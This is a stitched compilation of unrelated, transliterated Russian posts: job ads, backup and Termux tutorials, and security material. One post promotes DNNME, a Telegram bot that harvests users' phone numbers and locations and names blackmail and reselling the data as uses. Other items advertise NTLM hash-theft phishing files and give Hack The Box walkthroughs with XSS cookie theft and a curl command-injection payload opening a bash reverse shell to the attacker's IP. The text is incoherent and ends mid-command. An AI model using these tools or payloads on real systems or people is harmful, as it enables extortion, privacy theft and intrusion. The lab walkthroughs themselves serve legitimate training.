Vy budete rabotat' nad zadachami dlia kompanii-razrabotchika sleduiushchego pokoleniia avtonomnykh funktsii manevrirovaniia i parkovki na nebol'shoi skorosti.   Zadach v proekte mnogo: ot kontseptual'noi raboty nad dizainom protsessa, vybora KPI i nabora instrumentov dlia proverki, do integratsii i testirovaniia PO s pomoshch'iu virtual'nykh ili simuliatsionnykh metodov dlia vsemirno izvestnogo klienta. Tak kak klient mezhdunarodnyi, nuzhno znat' angliiskii na urovne B2 Upper Intermediate.   Rabotat' predstoit v Sankt-Peterburge, poetomu esli vy iz drugikh gorodov, bud'te gotovy s nashei pomoshch'iu pereekhat' v severnuiu stolitsu. Davno ne bylo zametok pro poleznye utility dlia bekapa. Reshil eto ispravit'. Rasskazyvaiu pro Butterfly Backup. Eto nebol'shaia konsol'naia obiortka nad rsync, napisannaia na python. Ideia eio v tom, chto ona ispol'zuet osnovnoe preimushchestvo rsync - skorost' sravneniia i kopirovaniia informatsii. A tak zhe dobavliaet nekotoruiu gibkost', kotoroi iznachal'no v rsync net. To est' rasshiriaet ego funktsional.    https://github.com/MatteoGuadrini/Butterfly-Backup  https://butterfly-backup.readthedocs.io/en/latest/    Butterfly Backup izbavliaet ot neobkhodimosti pisat' sobstvennuiu bash obviazku vokrug rsync dlia organizatsii inkrementnykh ili raznostnykh bekapov. Tak zhe uproshchaet vosstanovlenie i prosmotr soderzhimogo bekapov. Dlia udobstva mozhno podgotovit' gotovyi konfig.    Osnovnye vozmozhnosti:     Podderzhivaemye bekapy: Full, Incremental, Differential, Mirror.     Ispol'zovanie tsentral'nogo servera dlia khraneniia bekapov raznykh klientov.     Detal'nyi prosmotr soderzhimogo otdel'nykh bekapov.     Bekap vsei sistemy, a tak zhe ee vosstanovlenie na drugoe zhelezo ili VM.     Printsip sniatiia dannykh agent-less, po protokolu rsync ili ssh.    Dlia raboty BB nuzhen Python3. Dalee dostatochno skopirovat' repozitorii i zapustit' skript ustanovki:  git clone https://github.com/MatteoGuadrini/Butterfly-Backup.git  cd Butterfly-Backup  sudo python3 setup.py    Posle etogo kopiruem rsa kliuchi, kotorye predvaritel'no sozdali, na udalennyi host, chtoby imet' k nemu dostup:  bb config --deploy host1    Dal'she zapuskaem prostoi bekap:  bb backup --computer host1 --destination /mnt/backup --data System --type Unix    U bb est' prednastroiki dlia tipovykh bekapov triokh tipov sistem - Unix, Windows, MacOS. Esli ukazat' posle kliucha data tip dannykh i dalee tip sistemy, to budet zabekapleno vsio, chto otnositsia k etomu tipu. V moem primere eto sistemnye direktorii.    Po ssylke na dokumentatsiiu, chto ia privel v nachale, mozhno posmotret' vse osnovnye vozmozhnosti i kliuchi dlia bekapa i vosstanovleniia.

!! Junior Python Developer Privet! hybrid.ai -- samyi innovatsionnyi i nezavisimyi adtech proekt v Rossii. hybrid.ai -- mezhdunarodnaia programmatic-platforma. My razrabatyvaem reklamnye tekhnologii dlia vedushchikh mirovykh agentstv i brendov. Den' za dnem my uluchshaem funktsional'nye vozmozhnosti i kachestvo produktov dlia prevoskhodnogo rezul'tata reklamnykh kampanii. My sotrudnichaem s takimi krupnymi mirovymi kompaniiami kak Google, Facebook, Yandex, AppNexus, Begun, Mopub i mnogimi drugimi. Sredi nashikh klientov bolee 100 krupneishikh reklamnykh agentstv (GroupM, BBDO, Dentsu Aegis Network, Publicis Groupe i dr.), i bolee 300 vedushchikh brendov (Audi, Lexus, Honda, Nestle, Red Bull, Asus, P&G, Schwarzkopf i dr.). Ofisy hybrid.ai nakhodiatsia v Rossii, Germanii, SShA, Indii, Pol'she i Singapure.Seichas my v aktivnom poiske Junior Python Developer v sviazi s rasshireniem shtata. Chem predstoit zanimat'sia:  Napisanie skraperov dlia saitov, parsing dannykh; Refaktoring sushchestvuiushchikh prilozhenii; Razrabotka Rest Api i napisanie dokumentatsii k nemu; Integratsiia so storonnimi API; Razvitie sistemy monitoringa; Sozdanie prilozhenii dlia polucheniia i analiza dannykh.  Nashi trebovaniia k kandidatam:  Znanie Python3; Znanie Linux na urovne pol'zovatelia; Ponimanie chem otlichaiutsia SQL ot NoSql. Opyt raboty s kakoi libo bazoi; Znanie kakogo libo veb - freimvorka (naprimer Flask); Ponimanie printsipov Rest; Stremlenie pisat' chitaemyi kod; Bazovye znaniia sistem kontrolia versii (Git); Angliiskii iazyk na urovne svobodnogo chteniia dokumentatsii;  Chto my predlagaem dlia komfortnoi raboty:  Druzhnaia komanda i liogkaia kommunikatsiia; Professional'noe razvitie, svoboda proiavleniia idei i myslei; Shtatnyi prepodavatel' angliiskogo iazyka; Korporativnyi trener iogi.  A teper' o formal'nom:  Gibkoe nachalo i okonchanie rabochego dnia; Oformlenie i garantii po TK RF; Uiutnyi ofis v tsentre goroda so vsemi pliusami.       Sviazat'sia mozhno po ssylke: https://resumetrud.com/tambov/vakansii/15732135/  #rabota_v_Rossii #rabota_Tambov #Junior_PythonDeveloper

Chto nuzhno znat' Python-razrabotchiku Startovat' v liuboi kar'ere, v tom chisle i python-programmistu stoit s azov professii. Itak, davaite dlia nachala razberiomsia, kakimi znaniiami dolzhen obladat' Junior Python-developer (novichok). Potentsial'nomu Python-spetsialistu sleduet chitat' mnogo literatury, umet' bystro nakhodit' nuzhnuiu informatsiiu, a takzhe:    Predstavliat' chto takoe operatsionnye sistemy, dlia chego oni nuzhny, kakie tam proiskhodiat protsessy;  Znat', chto takoe potok;  Chto takoe sokety i dlia chego oni nuzhny;  Predstavliat', kak ustroen stek protokolov TCP/IP;  Chto takoe Linux, sh.;  Ponimat' virtualizatsiiu i vse eio tipy;  Umet' nastraivat' onlain-mashiny s pomoshch'iu razlichnykh instrumentov;  Ponimat', chto takoe OOP i ego funktsional;  Rabotat' s GIT(sozdavat' vetki);  Ponimat', chto takoe MVC i zachem on nuzhen;  Umet' rabotat' s bazami dannykh;  Ponimat' asinkhronnuiu kontseptsiiu programmirovaniia;  Rabotat' s nginx (nastroika proksi);  Razbirat'sia v otlichiiakh Python2 ot Python3;  Predstavliat' chto takoe algoritm importa modulei v Python;  Chto predstavliaiut iz sebia generatory i iteratory;  Ponimat' chto takoe GIL i zachem on nuzhen;  Razbirat'sia v WSGI i ponimat' kak ispol'zovat' ego v rabote.  Okunuvshis' v novyi mir i poniav kak mnogo v niom interesnogo, programmisty s novym opytom prodolzhaiut svoi kar'ernyi put'. Dalee, rassmotrim spisok togo, chto dolzhen znat' python-razrabotchik v srednem, po mneniiu rabotodatelei (v dopolnenie k predydushchim trebovaniiam):    Umelo ispol'zovat' sam iazyk, biblioteki, ego sintaksis, veb-freimvorki (Django i Flask);  Ponimat' printsipy raboty s bazami dannykh, algoritmami i SQL;  Angliiskii iazyk, potomu chto komandy v Python pishutsia na etom iazyke;  Znat' i umet' ispol'zovat' v rabote sistemy kontrolia versii (Git);  Ponimat' upravlenie paketami (versii, zavisimosti) v distributive i okruzhenii Python;  Umet' testirovat' kod, rabotat' s nepreryvnoi integratsiei;  Razbirat'sia v optsiiakh razviortyvaniia koda;  Realizovyvat' vse urovni steka (proekta);  Rabotat' s bibliotekami dlia raspredeleniia i obrabotki dannykh;  Umet' rabotat' v komande na urovne koda: pisat' chitaemyi kod, analizirovat' kod svoikh kolleg (code-review);  Ponimat' metodologiiu razrabotki.  Vmeste s etimi navykami spetsialistu neobkhodimy takie lichnye kachestva kak usidchivost', trudoliubie, analiticheskii sklad uma i umenie rabotat' v komande.

Stat'ia iavliaetsia prodolzheniem pervoi, vtoroi i tret'ei chastei, posviashchionnykh organizatsii prakticheskoi bezopasnosti setei, postroennykh na oborudovanii MikroTik. Ranee byli rassmotreny obshchie rekomendatsii, bezopasnost' urovnei L1, L2 i L3, realizatsiia tsentralizovannogo logirovaniia. Nastalo vremia pogovorit' pro razviortyvanie IDS i eio integratsiiu v infrastrukturu RouterOS.

DNNME (https://github.com/lamer112311/DNNME.git) -- telegram-bot, kotoryi <<uznaet>> dannye po nomeru telefona. A chtoby poluchit' <<dannye>> nuzhno zaregistrirovat'sia v bote, tem samym pol'zovatel' otpravliaet kontakt botu i geopozitsiiu, v rezul'tate my imeem nomer i geolokatsii pol'zovatelia    Vse dannye s bota budut idti priamo k vam v ls v Telegram. Primenenii mozhno naiti mnogo, k primeru, obychnyi shantazh, libo sbor ogromnoi bazy pol'zovatelei, kotoruiu v posledstvii mozhno prodat'.    Ustanovka    $ apt update  $ apt upgrade -y  $ apt install git python3  $ pip3 install colorama pyTelegramBotAPI  $ git clone https://github.com/lamer112311/DNNME.git  $ cd DNNME    Teper' perekhodim v Telegram. otkryvaem @my_id_bot, kopiruem nash ID i zapisyvaem ego. Perekhodim v [id199142634|@BotFather], vvodim /newbot, dalee pishem nuzhnye dannye. Kogda sam bot sozdan, kopiruem ego token i zapisyvaem ego.    Zapusk    $ python3 Build.py    Vvodim nash Telegram ID, potom vvodim Token bota. V papke dolzhen poiavitsia gotovyi skript dlia zapuska bota.    $ python3 Dnnme.py  Diskleimer: Predstavlennyi material, iavliaetsia oznakomitel'nym . Avtor ne nesiot otvetstvennosti za deistviia sovershennye chitateliami.    Skript polnost'iu rabochii

A tool for generating multiple types of NTLMv2 hash theft files.  ntlm_theft is an Open Source Python3 Tool that generates 21 different types of hash theft documents. These can be used for phishing when either the target allows smb traffic outside their network, or if you are already inside the internal network.  The benefits of these file types over say macro based documents or exploit documents are that all of these are built using "intended functionality". None were flagged by Windows Defender Antivirus on June 2020, and 17 of the 21 attacks worked on a fully patched Windows 10 host.  ntlm_theft supports the following attack types:    Browse to Folder Containing    .url - via URL field  .url - via ICONFILE field  .lnk - via icon_location field  .scf - via ICONFILE field (Not Working on Latest Windows)  autorun.inf via OPEN field (Not Working on Latest Windows)  desktop.ini - via IconResource field (Not Working on Latest Windows)      Open Document    .xml - via Microsoft Word external stylesheet  ... #ntlm_theft #windows #windows10 #windowsdefender

Hack The Box. warning Pod kliu chat' sia k mashinam s HTB rekomen duet sia tol' ko cherez VPN. Ne delai eto go s komp' iute rov, gde est' vazh nye dlia tebia dan nye, tak kak ty oka zhesh' sia v obshchei seti s dru gimi uchas tni kami. Razvedka Skanirovanie portov Ad res mashiny -- 10.10.10.234, dobav liaem ego v /etc/hosts i nachina em ska niro vanie por tov. Spravka: skanirovanie portov Ska niro vanie por tov -- stan dar tnyi per vyi shag pri liuboi ata ke. On poz volia et ata kuiushche mu uznat', kakie sluzh by na khos te pri nima iut soedi nenie. Na osno ve etoi informa tsii vybira etsia sle duiushchii shag k poluche niiu toch ki vkho da. Na ibo lee izves tnyi ins tru ment dlia ska niro vaniia -- eto Nmap. Uluch shit' rezul' taty ego raboty ty mozhesh' pri pomoshchi sle duiushche go skrip ta. ports = $(nmap -p- --min-rate =500 $1 | grep ^[ 0- 9] | cut -d '/ ' -f 1 | tr ' n' ', ' | sed s/,$//)nmap -p $ports -A $1 On dei stvu et v dva eta pa. Na per vom pro izvo dit sia obych noe bys troe ska niro vanie, na vto rom -- bolee tshcha tel' noe ska niro vanie, s ispol' zovani em ime iushchikh sia skrip tov (optsiia -A). Re zul' tat raboty skrip taNa khodim tri otkry tykh por ta: 22 (sluzh ba SSH), 80 (veb-ser ver Apache 2.4.46) i 33060. Per vym delom proi dem sia po sai tu i soberem informa tsiiu. Star tovaia stra nitsa sai taNa stra nitse About my nakhodim poch tu dlia svia zi, a tak zhe domen -- schooled.htb. Stra nitsa About Skanirovanie veb-kontenta Bol' she nichego nai ti ne uda los', a tak kak schooled.htb oka zal sia zaregis tri rovan nym domenom, sto it pomimo ska niro vaniia fai lov i direk torii pereb rat' tak zhe i pod domeny. Ia eto delaiu s pomoshch'iu Burp Intruder -- on ume et pro dol zhat' ska niro vat' pos le obry va soedi neniia. Perenap ravlia em zap ros v Intruder, uka zyva em slo var' /Discovery/DNS/subdomains-top1million-5000.txt iz nabora SecLists, a tak zhe usta novim 120 potokov. Nas troi ka Burp -- Positions Nas troi ka Burp -- Payloads Nas troi ka Burp -- Options Re zul' tat perebo raI my nakhodim novyi pod domen -- moodle.schooled.htb. Sra zu dobavim ego v /etc/hosts i pos motrim, chto tam. Star tovaia stra nitsa MoodleMoodle -- eto veb-pri lozhe nie, pri pomoshchi kotoro go mozh no delat' sai ty dlia onlai novogo obu cheniia. Sis tema poz volia et nas tra ivat' makety stra nits, k tomu zhe mozh no naladit' integra tsiiu s raz nym PO, vkliu chaia ins tru men ty dlia obshche niia, sov mes tnoi raboty i upravle niia dokumen tami. Chto ochen' vazh no, Moodle ras prostra niaet sia svo bod no i ime et otkry tyi iskhodnyi kod. For ma avto riza tsii Moodle Tochka vkhoda Poisk eksploitov Tak kak my ime em delo s gotovym pro duk tom, net smys la <<tykat' kavych ki>> samos toiatel' no. Goraz do pro duk tivnee budet uznat' toch nuiu ver siiu i pois kat' informa tsiiu ili otche ty ob uzhe ime iushchikh sia uiaz vimos tiakh, a voz mozhno, i gotovye eks plo ity. Mozh no nai ti is khodnye kody na GitHub i uznat', gde v prog ramme ras polozhe na informa tsiia o tekushchei ver sii. Smot rim, chto u nas na ser vere, i uzna em, chto ispol' zuet sia ver siia 3.9. Fail upgrade.txt v repozi tori iakh GitHub Zap ros fai la upgrade.txt na ser vereTe per' mozhem pois kat' informa tsiiu ob uiaz vimos tiakh i gotovykh eks plo itakh. Spravka: poisk gotovykh eksploitov Pri pen teste luch she vse go iskat' eks plo ity pri pomoshchi Google, pos kol' ku etot pois kovik zag liadyva et i v lich nye blo gi, i v samye raz nye otche ty. Usko riat delo spe tsiali ziro van nye bazy vro de Exploit-DB -- tam chas to mozh no obna ruzhit' pod khodiashchie vari anty. Esli ty rabota esh' v spe tsiali ziro van noi OS vro de Kali Linux, to eta baza u tebia uzhe est' i dlia pois ka mozh no ispol' zovat' uti litu searchsploit. Eks plo ity, nai den nye searchsploitDlia ver sii 3.9 eks plo itov net, no est' dlia bolee sve zhei 3.10.3. Sto it ee pop robovat', tak kak est' vero iatnost', chto uiaz vimost' pri suts tvu et i v ran nikh ver siiakh. Pos motrim detali uiaz vimos ti. searchsploit -p php/ webapps/ 49714. txt Po luche nie eks plo ita Opi sanie uiaz vimos ti Ekspluatatsiia Stored XSS Eta ver siia uiaz vima k ata ke XSS, pri chem khra nimoi. Dlia pro ver ki uiaz vimos ti regis tri ruem sia i avto rizu emsia v sis teme. Vned rit' kod mozh no cherez pole MoodleNet profile v nas troi kakh pol' zovate lia. Davai vned rim sle duiushchii kod, kotoryi budet pokazy vat' okosh ko s tek stom 1.  Sokh ranenie nag ruzkiTak kak eto Stored XSS, kod budet vypol niat' sia kazh dyi raz pri pros motre pol' zovate lem nashego pro filia. Vy pol nenie koda pri pros motre pro filiaTak kak uiaz vimost' pod tverzhde na, my mozhem ukrast' cookie. Dlia eto go otkro em na lokal' nom khos te veb-ser ver python3. python3 -m http. server 8888 A teper' vned rim kod, kotoryi budet zag ruzhat' s nashego ser vera kar tinku, a v kaches tve paramet ra budem pereda vat' kuki. Tak oni i popadut k nam.  Lo gi veb-ser veraSre di mno zhes tva zap rosov my nakhodim tot, zna chenie paramet ra kotoro go otli chaet sia. Pod stav liaem poluchen nye cookie i perezag ruzha em stra nitsu. Tak my nachina em rabotat' pod uchet noi zapis'iu pre poda vate lia. Te kushchii pol' zovatel'

AutoHarness is a tool that automatically generates fuzzing harnesses for you. This idea stems from a concurrent problem in fuzzing codebases today: large codebases have thousands of functions and pieces of code that can be embedded fairly deep into the library. It is very hard or sometimes even impossible for smart fuzzers to reach that codepath.  Even for large fuzzing projects such as oss-fuzz, there are still parts of the codebase that are not covered in fuzzing. Hence, this program tries to alleviate this problem in some capacity as well as provide a tool that security researchers can use to initially test a code base. This program only supports code bases which are coded in C and C++.Setup/DemonstrationThis program utilizes llvm and clang for libfuzzer, Codeql for finding functions, and python for the general program. This program was tested on Ubuntu 20.04 with llvm 12 and python 3. Here is the initial setup.  sudo apt-get update;sudo apt-get install python3 python3-pip llvm-12* clang-12 git;pip3 install pandas lief subprocess os argparse ast;  Follow the installation procedure for Codeql on https://github... #autoharness #performance #procedure #python #python3

Osvoenie Termux kak udobnoi podruchnoi konsoli.  Chto takoe Termux? Eto konsol' na OS Android. Tem samym ona stanovitsia nashim glavnym i podruchnykh sredstvom raboty.  Skachat' ego mozhno po etoi ssylke: https://termux.com/  Kak tol'ko vy ego skachali vy uvidete samu konsol'  Propisyvaem:  pkg update   apt update   apt upgrade  Dalee nam nuzhno ustanovit' vse samoe neobkhodimoe dlia pol'zovaniia Termux.   V osnovnom vse skripty i progi my budem brat' s GitHub, poetomu ustanovim pakt git, kotoryi budet skachivat' skripty s repozitoriia.   pkg install git  Teper' my mozhem skachivat' repozitorii (iashchiki s skriptami)   Dlia etogo: git clone "ssylka na repozitorii"   V ostal'nom vse pridiot so vremenem.   Teper' proidiomsia po osnovnym komandam v termuks.   cd - komanda dlia osnovnogo peremeshcheniia.  cd "nazvanie papki"  cd bez nichego vozvrashchaet vas na pervonachal'nuiu papku  ls - pokazyvaet soderzhimoe papki  mkdir - sozdaiot papki   mv - peremeshchaet chto libo   rm - udaliaet chto libo   Tak zhe dlia udobstva mozhno ustanovit' repozitorii termux - ohmyzsh chtoby bylo legche i krasivee adaptirovat'sia v termukse.   + ustanovim instrumenty v Termux   pkg install termux-tools  Teper' my mozhem otkryvat' faily v termuks.   termux-open "fail"   Teper' ustanovim osnovnye iazyki programmirovaniia dlia ispol'zovaniia utilitami:  Piton apt install python  apt install python2 apt install python3  Ustanovim tak zhe klassnyi repozitorii s gitkhaba  git clone https://github.com/AnonHackerr/toolss  S pomoshch'iu ego, mozhno ustanovit' raznye "instrumenty" v Termux.   Poka chto vse, nadeius' etogo khvatit dlia osvoeniia nachala raboty.

HostHunter es una herramienta completamente gratuita para descubrir y extraer de forma eficiente los hostname, o nombre de host, que proporcionan un gran conjunto de direcciones IP publicas. Esta herramienta utiliza tecnicas sencillas de OSINT para asignar direcciones IP con nombres de host virtuales, permite generar un archivo CSV o TXT que contiene toda la informacion recopilada. ?Quieres saber de todo lo que es capaz esta herramienta?  Principales caracteristicas de HostHunter HostHunter es una herramienta basada en python3 que esta disenada especificamente para descubrir los dominios o los hostname que pertenecen a una o varias direcciones IP publicas. Nosotros podemos pasarle a esta herramienta un archivo TXT con todas las direcciones IP que queremos investigar, automaticamente la herramienta nos indicara todos los dominios encontrados en una determinada direccion ip publica, ademas, tambien podria indicarnos si hay alguna web app funcionando en esa direccion IP en concreto. Este reconocimiento se realiza a traves de tecnicas OSINT sencillas, por lo que realmente no realiza ning&#25..

Hack The Box. My pro vedem tes tirova nie kli ent-ser verno go pri lozhe niia, ser vernaia chast' kotoro go napisa na na Node.js. A zatem porabo taem s orkes tra torom Kubernetes i cherez nego zakh vatim flag ruta. warning Pod kliu chat' sia k mashinam s HTB rekomen duet sia tol' ko cherez VPN. Ne delai eto go s komp' iute rov, gde est' vazh nye dlia tebia dan nye, tak kak ty oka zhesh' sia v obshchei seti s dru gimi uchas tni kami. Razvedka Skanirovanie portov Do bav liaem adres mashiny 10.10.10.235 v fail /etc/hosts kak unobtainium.htb i zapus kaem ska niro vanie por tov. Spravka: skanirovanie portov Ska niro vanie por tov -- stan dar tnyi per vyi shag pri liuboi ata ke. On poz volia et ata kuiushche mu uznat', kakie sluzh by na khos te pri nima iut soedi nenie. Na osno ve etoi informa tsii vybira etsia sle duiushchii shag k poluche niiu toch ki vkho da. Na ibo lee izves tnyi ins tru ment dlia ska niro vaniia -- eto Nmap. Uluch shit' rezul' taty ego raboty ty mozhesh' pri pomoshchi sle duiushche go skrip ta. ports = $(nmap -p- --min-rate =500 $1 | grep ^[ 0- 9] | cut -d '/ ' -f 1 | tr ' n' ', ' | sed s/,$//)nmap -p $ports -A $1 On dei stvu et v dva eta pa. Na per vom pro izvo dit sia obych noe bys troe ska niro vanie, na vto rom -- bolee tshcha tel' noe ska niro vanie, s ispol' zovani em ime iushchikh sia skrip tov (optsiia -A). Re zul' tat raboty skrip ta Re zul' tat raboty skrip ta (pro dol zhenie) Re zul' tat raboty skrip ta (okon chanie)Po rezul' tatam ska niro vaniia ime em vosem' otkry tykh por tov: port 22 -- sluzh ba SSH; port 80 -- Apache httpd 2.4.41; por ty 2379, 2380 -- poka neias no, chto eto; port 8443 -- tozhe veb-ser ver; por ty 10250, 10256 -- Golang HTTP-Server; port 31337 -- Node.js Express framework. Nach nem s osmotra sai ta. Star tovaia stra nitsa sai taZdes' nam daiut tol' ko ska chat' kakoe-to pri lozhe nie, chto my i dela em. Ska chiva em paket .deb i raz vorachi vaem, chto by ne usta nav livat' na lokal' nyi khost. Zatem nakhodim ispolnia emyi fail i zapus kaem pri lozhe nie. mkdir ubo ; cd mkdir dpkg- deb -xv unobtainium_ 1. 0. 0_ amd64. deb . . / opt/ unobtainium Ras pakov ka paketa deb Glav noe okno pri lozhe niiaIzu chiv pri lozhe nie, ponima em, chto ono ime et kli ent-ser vernuiu arkhi tek turu. Zdes' est' for ma otprav ki soob shchenii i voz mozhnost' smot ret' spi sok del. Spi sok vyg liadit vot tak: Create administrator zone. Update node JS API Server. Add Login functionality. Complete Get Messages feature. Complete ToDo feature. Implement Google Cloud Storage function. Improve security. Spi sok todo Analiz trafika Itak, my uzna li, chto ispol' zuet sia tekh nologiia Node.js, est' avto riza tsiia i raz delenie pri vile gii (punkt 1). Pos kol' ku pri lozhe nie -- eto kli ent, mozhem pred polozhit', chto ono stu chit sia na port 31337, obna ruzhen nyi nami pri ska niro vanii. Nam nuzh no pro verit' eto pred polozhe nie, a pomozhet nam v etom Wireshark. Otkry vaem ego i zapus kaem nashe pri lozhe nie sno va. Tra fik pri lozhe niia v WiresharkVi dim, chto pri lozhe nie rabota et po HTTP i dei stvi tel' no pod kliu chaet sia k por tu 31337. Ad res ser vernoi chas ti pri lozhe niiaPop robu em vruch nuiu ispol' zovat' fun ktsii pri lozhe niia, chto by uznat', kak imen no oni rabota iut. Zap rosim spi sok del i otpra vim kakoe-nibud' soob shchenie. So der zhimoe fai la package.jsonU nas est' sle duiushchie zavisi mos ti: body-parser: 1.18.3; express: 4.16.4; lodash: 4.17.4; google-cloudstorage-commands: 0.0.1; Nam izves tny tekh nologii, poeto mu sle duet pois kat' gotovye eks plo ity, chto by poniat', kakie mogut byt' uiaz vimos ti. Delat' eto luch she vse go pri pomoshchi Google. Po isk uiaz vimos tei s pomoshch'iu Google Po isk uiaz vimos tei s pomoshch'iu GoogleTak my nakhodim dve uiaz vimos ti v moduliakh google-cloudstorage-commands i lodash. Per vaia mozhet dat' nam OS Command injection, to est', dru gimi slo vami, uda len noe vypol nenie komand. U nas uzhe est' uiaz vimyi blok koda (nizhe pri vede ny skri ny iz PoC i koda index.js). PoC eks plo ita google-cloudstorage-commands Kod obra bot chika metoda post iz fai la index.jsPri pereda che paramet ra filename metodom POST na stra nitsu /upload my mozhem vypol nit' koman du. No pered etim ser ver pro veria et, ime et li dan nyi pol' zovatel' svoi stvo canUpload. Ob' ekty usersEtikh svoi stv u nas net, no mozhem ikh poluchit'. V etom pomozhet kri tiches kaia uiaz vimost' v bib liote ke lodash. My mozhem ispol' zovat' atri but constructor ob' ekta, pred stav liaiushche go pol' zovate lia, chto by akti viro vat' dan nye pri vile gii. I u nas sno va est' uiaz vimyi blok koda (nizhe pri vede ny skri ny iz PoC i koda index.js). Pri mer uiaz vimogo koda lodash Kod obra bot chika metoda put iz fai la index.jsPri pereda che paramet ra text metodom PUT na stra nitsu / my smo zhem vypol nit' opas noe sli ianie ob' ektov. Tochka opory Da vai pro eks plu ati ruem eto i akti viru em u sebia svoi stva canUpload i canDelete. Dlia eto go otpra vim sle duiushchee soob shchenie: { "text" : { "constructor" : { "prototype" : { "canDelete" : true , "canUpload" : true } } } } } Ak tivatsiia pri vile giiPo luchi li otvet, chto vse vypol neno bez oshi bok. Teper' dlia pro ver ki vypol nim koman du id, kak bylo opi sano vyshe. Rezul' tat zapishem v fail. Vy pol nenie koman dy i zapis' rezul' tata v failOs talos' pro chest' soder zhimoe fai la legitim nym spo sobom. Chte nie fai laKak mozh no uvi det', koman da uspeshno vypol nena, a vsia nasha kon tseptsiia poluchi la pod tverzhde nie. Mozh no vypol nit' revers-shell. Spravka: revers-shell Ob ratnyi shell -- eto pod kliu chenie, kotoroe akti viru et ata kuemaia mashina, a my pri nima em i takim obra zom pod kliu chaem sia k nei, chto by vypol niat' koman dy ot litsa pol' zovate lia, kotoryi zapus til shell. Dlia pri ema soedi neniia neob khodimo soz dat' na lokal' noi mashine listener, to est' <<slu shatel'>>. V takikh slu chaiakh pri godit sia rlwrap -- readline-obo loch ka, kotoraia v chis le pro chego poz volia et pol' zovat' sia isto riei komand. Ona obych no dos tupna v repozi torii dis tri buti va. apt install rlwrap V kaches tve samogo lis tenera pri etom mozh no ispol' zovat' shiroko izves tnyi netcat. rlwrap nc -lvp [ port] Chto by bys tro vos sta nav livat' soedi nenie v slu chae ego poteri, ia napisal malen' kii skript na Bash, soder zhashchii dve koman dy. Eto te zhe koman dy, chto pred stav leny v zap rosakh vyshe, tol' ko bez chte niia fai la. #!/ bin/ bash curl -X PUT -H "Content-Type: application/ json" -d '{ "auth":{ "name": "felamos", "password": "Winter2021"}, "message":{ "text":{ "constructor":{ "prototype":{ "canDelete": true, "canUpload": true}}}}} ' http:/ / unobtainium. htb: 31337/ curl -X POST -H "Content-Type: application/ json" -d '{ "auth":{ "name": "felamos", "password": "Winter2021"}, "filename": "& echo "bash -i > & / dev/ tcp/ 10. 10. 14. 126/ 4321 0> & 1" | bash"} ' http:/ / unobtainium. htb: 31337/ upload Flag pol' zovate lia Prodvizhenie Te per', kog da my poluchi li dos tup k khos tu, nam neob khodimo sob rat' informa tsiiu. Dlia eto go ia obych no ispol' zuiu skrip ty PEASS. Spravka: skripty PEASS dlia Linux Chto delat' pos le togo, kak my poluchi li dos tup v sis temu ot ime ni pol' zovate lia? Vari antov dal' neishei eks plu ata tsii i povyshe niia pri vile gii mozhet byt' ochen' mno go, kak v Linux, tak i v Windows. Chto by sob rat' informa tsiiu i nametit' tseli, mozh no ispol' zovat' Privilege Escalation Awesome Scripts SUITE (PEASS) -- nabor skrip tov, kotorye pro veria iut sis temu na avto mate. Chto by vos pol' zovat' sia skrip tom, ego nado sna chala zag ruzit' na lokal' nyi khost. wget https:/ / github. com/ carlospolop/ privilege- escalation- awesome- scripts- suite/ blob/ master/ linPEAS/ linpeas. sh Te per' nuzh no zag ruzit' ego na uda len nyi khost. V direk torii so skrip tom na lokal' noi mashine zapus tim s pomoshch'iu Python pros toi veb-ser ver. Pos le vypol neniia etoi koman dy veb-ser ver budet pros lushivat' port 8000. python3 -m http. server A teper' s pomoshch'iu togo zhe wget na tselevoi mashine zag ruzim skript s lokal' nogo khos ta na uda len nyi. Pos le zag ruzki neob khodimo dat' fai lu pra vo na vypol nenie i vypol nit' skript. wget http://[ ip_lokal'nogo_khosta] : 8000/ linpeas. sh chmod +x linpeas. sh . / linpeas. sh Iz vyvoda LinPEAS ia uznal, chto na khos te rabota et pol' zovatel' skaia zadacha v cron. Kazh duiu minutu pro iskho dit poisk i uda lenie fai la kubectl. A eto ozna chaet ispol' zovanie orkes tra tora Kubernetes. Za dachi cronKubernetes poz volia et upravliat' klas terom kon tei nerov Linux kak edi noi sis temoi. Kubernetes upravlia et kon tei nerami Docker, zapus kaet ikh na bol' shom koliches tve khos tov, a tak zhe obes pechiva et sov mes tnoe raz meshchenie i rep likatsiiu bol' shogo koliches tva kon tei nerov. Chto nam nuzh no ponimat' pri rabote s Kubernetes: Node -- eto mashina v klas tere Kubernetes; Pod -- eto grup pa kon tei nerov s obshchi mi raz delami, zapus kaemykh kak edi noe tseloe; Service -- eto abs trak tsiia, kotoraia opre delia et logiches kii ob' edi nen nyi nabor pod i politi ku dos tupa k nim; Volume -- eto direk toriia (voz mozhno, s dan nymi), kotoraia dos tupna v kon tei nere; Label -- eto para kliuch/zna chenie, kotorye prik replia iutsia k ob' ektam, nap rimer podam, i mogut byt' ispol' zovany dlia soz daniia i vybora naborov ob' ektov. Dlia raboty s kuberom nam nuzhen kubectl, a on uda liaet sia raz v minutu. Ska chaem ego na lokal' nuiu mashinu, a zatem zag ruzim na uda len nyi khost takim zhe spo sobom, kak i LinPEAS. Ia zag ruzhaiu ego pod ime nem kctl. Te per' fail uda liat' sia ne budet, mozhem porabo tat' s Kubernetes. Bla goda ria kubectl nam dos tupna koman da can-i, s pomoshch'iu kotoroi my mozhem pro verit' svoi pri vile gii na to ili inoe dei stvie. V otvet budet voz vra shchat' sia yes ili no. V klas tere Kubernetes ob' ekty secret pred nazna cheny dlia khra neniia kon fiden tsial' noi informa tsii, takoi kak paroli, tokeny OAuth ili kliu chi SSH. I eto per voe, chto nuzh no pro verit'. kubectl auth can- i list secrets Pro ver ka sek retovK sozhale niiu, my ne mozhem pros motret' sek rety. Sle duiushchee, chto nuzh no pro verit', -- eto pros trans tva imen (namespaces) -- vir tual' nye klas tery, rabota iushchie v odnom i tom zhe fiziches kom klas tere. Namespaces pre dos tavlia iut nabor uni kal' nykh imen dlia resur sov. Davai uzna em, mozhem li my poluchit' ikh. kubectl auth can- i list namespaces Pro ver ka pros transtv imenMy mozhem poluchit' pros trans tva imen sle duiushchei pros toi koman doi. kubectl get namespaces Po luche nie namespacesPo umol chaniiu v klas tere Kubernetes budet soz dano pros trans tvo imen default, v kotorom raz meshcha iutsia zapus kaemye ob' ekty. Pros trans tva kube-public i kube-system ispol' zuiut sia dlia zapus ka slu zheb nykh ob' ektov Kubernetes, neob khodimykh dlia kor rek tnoi raboty klas tera. No nam (sudia po naz vaniiu) bol' she inte res no pros trans tvo imen dev i sis temnyi kube-system. No ni v per vom, ni vo vto rom pros trans tve dos tupa k sek retam ne ime em. kubectl auth can- i list secrets -n dev kubectl auth can- i list 